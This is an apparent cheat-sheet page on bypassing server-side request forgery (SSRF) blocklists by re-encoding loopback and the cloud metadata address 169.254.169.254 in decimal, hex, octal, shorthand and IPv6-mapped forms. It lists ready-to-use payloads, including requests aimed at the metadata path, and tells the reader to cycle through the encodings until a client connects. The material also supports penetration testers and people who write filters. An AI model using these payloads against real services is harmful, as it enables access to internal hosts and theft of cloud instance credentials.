---
title: "IP address encodings for SSRF filter bypass"
description: "Loopback and metadata addresses can be written in decimal, octal, hex, IPv6-mapped, and shorthand forms that resolve to the same host while defeating a string-matching blocklist."
keywords:
  - SSRF IP bypass
  - decimal IP
  - octal IP
  - hex IP
  - IPv4-mapped IPv6
  - 169.254.169.254
  - 127.0.0.1 bypass
---

# IP address

A blocklist that rejects `127.0.0.1` and `169.254.169.254` as literal strings is defeated by writing the same address a different way. `inet_aton`-style parsers, the browser URL parser, and most HTTP clients accept several numeric formats and collapse them to the same 32-bit value, so an equivalent encoding passes the text filter and resolves to the internal host.

## Loopback in other bases

`127.0.0.1` has many equal forms. The parser folds each to the same address:

```
2130706433            # decimal (dotless)
0x7f000001            # hex (dotless)
0x7f.0x0.0x0.0x1      # dotted hex
0177.0.0.1            # first octet in octal (0177 = 127)
0177.0000.0000.0001   # fully octal
127.1                 # shorthand: last part fills the remaining octets
127.0.1               # shorthand
```

`127.1` expands to `127.0.0.1` because a trailing part fills all remaining octets. The all-interfaces address `0.0.0.0` reaches locally bound services on many stacks and is a frequent blocklist gap, as is the bare `0`, which several parsers read as `0.0.0.0`.

## The metadata address

The cloud link-local endpoint `169.254.169.254` folds the same way, which slips it past a filter keyed on the literal:

```
2852039166            # decimal
0xA9FEA9FE            # hex
0251.0376.0251.0376   # octal
[::ffff:169.254.169.254]   # IPv4-mapped IPv6
```

A trailing dot (`169.254.169.254.`) is also accepted by many resolvers and often bypasses a naive equality check.

## IPv6 forms of loopback

Where the client supports IPv6, loopback has its own representations, and a blocklist written only for IPv4 misses them:

```
[::1]                      # IPv6 loopback
[0:0:0:0:0:0:0:1]          # expanded
[::ffff:127.0.0.1]         # IPv4-mapped loopback
[::ffff:7f00:1]            # IPv4-mapped, hex tail
[0000::1]                  # leading-zero compression
```

## Mixing encodings

Parsers differ in which formats they accept and how they combine, so a value that one component rejects another folds. Combine a dotless decimal host with an unexpected scheme or port to clear both a host filter and a scheme filter at once, for example `http://2130706433:80/` or `http://0x7f000001/latest/meta-data/`. When a literal is blocked, work through decimal, hex, octal, shorthand, and IPv6-mapped forms in turn; a client that connects at all confirms which the stack normalizes.

## References

- [OWASP: Server Side Request Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [PortSwigger: SSRF](https://portswigger.net/web-security/ssrf)
- [PayloadsAllTheThings: Server Side Request Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
